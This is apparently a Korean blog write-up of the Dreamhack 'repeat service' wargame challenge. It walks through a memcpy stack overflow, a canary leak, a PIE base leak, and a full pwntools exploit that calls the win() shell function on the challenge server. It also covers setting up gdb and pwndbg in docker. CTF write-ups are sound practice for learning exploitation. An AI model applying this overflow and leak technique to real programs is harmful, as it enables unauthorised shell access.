---
layout: post
title: "[드림핵] repeat service"
categories: [System Hacking]
tags: [CTF, Wargame, Buffer Overflow, Exploit]
last_modified_at: 2024-02-27
---

![Image](https://blog.kakaocdn.net/dna/bVA9Yo/btsFgoBsjU0/AAAAAAAAAAAAAAAAAAAAAFSlSP_SSjOXiDLfxqY-GSTfTmqSjfEHkVmCaJjfqEIr/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=3HW%2By%2B%2FiJHDM6345l6mNxBKwrR8%3D)

```cpp
// gcc -o main main.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void win() {
    system("/bin/sh");
}

int main() {
    initialize();

    char inp[80] = {0};
    char buf[1000] = {0};

    puts("Welcome to the Repeat Service!");
    puts("Please put your string and length.");

    while (1) {
        printf("Pattern: ");
        int len = read(STDIN_FILENO, inp, 80);
        if (len == 0)
            break;
        if (inp[len - 1] == '\n') {
            inp[len - 1] = 0;
            len--;
        }

        int target_len = 0;
        printf("Target length: ");
        scanf("%d", &target_len);

        if (target_len > 1000) {
            puts("Too long :(");
            break;
        }

        int count = 0;
        while (count < target_len) {
            memcpy(buf + count, inp, len);
            count += len;
        }

        printf("%s\n", buf);
    }
    return 0;
}
```

코드 읽기  
1. win() 함수 존재 -> system("/bin/sh") //무언가를 이값으로 덮어야 하는 건가?  
2. memcpy에서 버퍼 오버플로우 존재.. buf보다 len이 더 크다면.. buf 이후 범위까지 덮어짐  
3. buf가 초기화되지 않아서 이전의 buf가 이후의 buf보다 길다면, 이후의 buf로 덮고 남은 부분도 그대로 출력  

| Stack Frame | Address |
|-------------|---------|
| ret         | 0x8     |
| sfp(rbp)    | 0x8     |
| canary      | 0x8     |
| buf         | 1000    |
| inp         | rbp-0x440 (0x440이 1088, inp가 80차지하고 buf가 1000 canary가 8 차지하면 1088 채워짐) |
| count       | rbp-0x444 |
| len         | rbp-0x448 |

위는 스택프레임이다.  
canary 릭 가능하지 않을까...?  
ㄴ해봤는데 안된다  
+ 스택프레임 오프셋 계산을 잘못해서 안되는 거였다  
릭하고 카나리 넣고 ret win함수로 덮어쓰면 되지 않을까........?  

win 함수를 어떻게 구하는가..?  
실제로 디버깅해보면 win함수는 실행할 때마다 바뀐다(PIE에 의해)  

![실행할 때마다 gdb로 print win한 결과](https://blog.kakaocdn.net/dna/HrwSc/btsFjU0h9g6/AAAAAAAAAAAAAAAAAAAAAG_a5CuBQL0Q59L4veltmLqGNgBgCsA9sgt7EYZdgGQ6/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=2GynoeQ0rxD7ZHV3%2FGXWMt5PXB4%3D)

PIE 우회는 아래 두 가지 방법이 있다  
1. 코드 베이스 구하기  
2. partial overwrite  

---------아래부터는 라업 참고----------------  
카나리와 PIE base값으로 win을 호출하는 게 문제의 목표(일단 시나리오 구상은 맞혔다는 것에 의의를 두기로..)  

<key point>  
count >= target_len이 되었을 때, while문 멈춤  
길이 3짜리 문자열과 target_len=7로 실행, count 0->3->6->9, 9가 되면 while문 멈춤  
그러나 buf에는 7바이트가 아닌 9바이트로 작성됨  
이를 계산해서 릭  

1. 카나리 릭  
buf 1000을 다 채우고 카나리의 \x00 채워줘야 하므로 1001 바이트 써줘야 함  
1001=7*11*13  
aaaaaaa를 target_len=1000 반복하면  
count가 0->7->14->21..->994->1001  
딱 맞게 입력  

![Image](https://blog.kakaocdn.net/dna/EdffF/btsFhgiKAcT/AAAAAAAAAAAAAAAAAAAAANlFoAhwJ0ricvu4v8RDtRiiwkUCBm4xQgcPdRDFhLVn/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=PuzS1xgmV4S%2BudDKCYDBHA0n5N4%3D)

2. PIE 베이스 주소 구하기  
도커 환경에서 실행 필수.. 그냥 하면 glibc 문제 생김  
라이트업에서 바이너리 실행 후 rbp를 보라는데 안된다  
컨테이너에 gdb를 깔아봤는데도 안되길래 컨테이너에서 실행중인 바이러니 호스트에서 gdb 분석을 써보았다  

![Image](https://blog.kakaocdn.net/dna/be3flh/btsFkJqUoz7/AAAAAAAAAAAAAAAAAAAAAHFU1Nh42-V2pNRXuD434jtaATPFfpgD6N8aBEEkShoP/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=%2Fotlrcl9aYiBX6U5u2jgKNgqnl0%3D)

창 하나는 컨테이너 접속해서 main 실행하고  

![Image](https://blog.kakaocdn.net/dna/bDy5nG/btsFhVZQwQa/AAAAAAAAAAAAAAAAAAAAAFMmQMnkWExYmWPQQOXdG6041uot5kHzCkpEcd8KZYp3/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=AS550bRPJjga1c0FEH5AgCJEsk4%3D)

호스트 창을 하나 더 추가해서 아래 명령어로 PID 찾기  
```bash
ps -ef | grep main
```

![Image](https://blog.kakaocdn.net/dna/NTFWF/btsFlT7M3OX/AAAAAAAAAAAAAAAAAAAAACFWPlPSRyhc95Fm7gWL9-uw46nzJrg7DD_L6K0p50tP/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=EWopiBZhV5FWqNk3FU2ZFJfKOlk%3D)

```bash
sudo gdb -p <PID>
```
이러면 gdb가 켜짐 pwndbg를 이용하려면 아래와 같이 작성  
```bash
source <gdbinit.py의 경로>
```

![Image](https://blog.kakaocdn.net/dna/sPYRi/btsFiuAT0NO/AAAAAAAAAAAAAAAAAAAAAHNXQ-UtDD1UmGi92_mTg9AFEZ1_UD0FnGORHfkevBTZ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=z83DAIilVnWVTkWEtqJ7INwr%2F9o%3D)

어.. 근데 생각해보니까 이건 이미 pattern까지 실행 된 후 디버깅이라 소용 없었다  
그래서 컨테이너에 gdb 다시 깔았는데 이번엔 됐다(pwndbg, gdb가 오류 났던 거 같다)  
```bash
sudo docker exec -u root -it my_docker_container /bin/bash
```
위 명령어로 root 권한 접속 후  
```bash
apt-get update
apt-get install gdb -y

apt-get install -y python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
git clone https://github.com/pwndbg/pwndbg
cd pwndbg
./setup.sh
```
위 명령어를 차례대로 입력해주면 gdb, pwndbg가 다운된다  

![Image](https://blog.kakaocdn.net/dna/CsHU0/btsFin9BNAB/AAAAAAAAAAAAAAAAAAAAAGq35Aac8HWJTLjAVymkB3rGovFbH8TnWynwHdtpmrX6/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=j%2BjducewU7O09vYt824CIO2guBE%3D)

rbp+0x18(한줄 0x10과 0x8) 부분이 main  
0x18= 24  
24+8+1000=1032  
1000+8은 rbp 여기에 +24 하면 main 주소  

3. Overwrite  
buf(1000)+카나리(8)+rbp더미(8)+ret(8)=1024  

4. 익스플로잇 코드  
vi와 pwntools를 설치해줘야 한다  
```bash
apt-get update
apt-get install vim
;중간에 y 한 번
```
```bash
$ apt-get update
$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
$ python3 -m pip install --upgrade pip
$ python3 -m pip install --upgrade pwntools
```
```python
#!/usr/bin/env python3
import sys
from pwn import *

BINARY_PATH = './main'

p = remote('host3.dreamhack.games', 10732) 
elf = ELF(BINARY_PATH)

def send(s, ln=1000):
    p.sendlineafter(b': ', s)
    p.sendlineafter(b': ', str(ln).encode())
    return p.recvuntil(b'\nPattern')[:-8]

# 1001 = 7 * 11 * 13
canary = b'\x00' + send(b"a" * 7)[-8:-1] # rbp is 1
print(f"Canary: {canary[::-1].hex()}")

# 1032 = 8 * 3 * 43
main_addr = int.from_bytes(send(b"a" * 43)[-6:], 'little')
print(f"main_addr: {main_addr:x}")

win_addr = main_addr - elf.symbols['main'] + elf.symbols['win']
print(f"win_addr: {win_addr:x}")

# 1024 = 2^10
send(b"a" * 8 + canary + b"\x00" * 8 + p64(win_addr + 5))

p.sendlineafter(b': ', b'a')
p.sendlineafter(b': ', b'1001')
p.interactive()
```

1. send 함수  
카나리와 main 주소를 받을 때 쓰는 함수이다.  
첫번째 매개변수로 pattern을 받고, 두번째 매개변수로 len=1000입력한다.  
\nPattern까지 받고 해당 부분(\nPattern)을 지워주기 위해 [:-8]로 설정해준다.  

2. canary 릭  
위에서 설명했던 것처럼 7개의 'a'로 1000 입력해준다.  

3. main 함수 구하기  
43개 'a'를 입력해주면 count가 0->43->...->989->1032(buf에서 main까지 거리)  
이러면 main 주소를 받을 수 있다.  

4. win 함수 구하기  
main 주소 - elf.symbols['main'] = 코드 베이스 주소  
코드 베이스 주소 + elf.symbols['win'] = win 주소  

5. overwrite  
'a'*8+canary(8)+sfp(8)+win(8) 총 32바이트  
buf에서 ret까지 1000+8+8+8=1024  
나머지가 없으므로 그대로 입력해주면 각 위치에 알맞게 자리함  

드림핵 마저 다 하면 ROP와 PIE 부분을 복습해야할 거 같다  
도커를 이용해서 문제 푸는 게 처음이라 이부분에서 시간을 너무 잡아먹었다..  
많이 풀어보고 익숙해져야 할 거 같다  